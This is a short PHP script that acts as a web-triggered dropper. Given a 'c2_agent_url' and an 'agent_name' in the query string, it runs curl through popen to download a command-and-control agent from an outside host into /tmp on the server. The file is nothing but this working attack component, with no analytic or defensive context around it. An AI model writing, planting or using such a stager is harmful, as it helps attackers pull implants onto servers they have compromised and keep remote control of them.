<?php
    if (isset($_GET['c2_agent_url'], $_GET['agent_name'])) {
        $c2AgentUrl = $_GET['c2_agent_url'];
        $agentName = $_GET['agent_name'];
        
        $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Download initiated successfully.";
        } else {
            echo "Failed to initiate download.";
        }
    }
?>
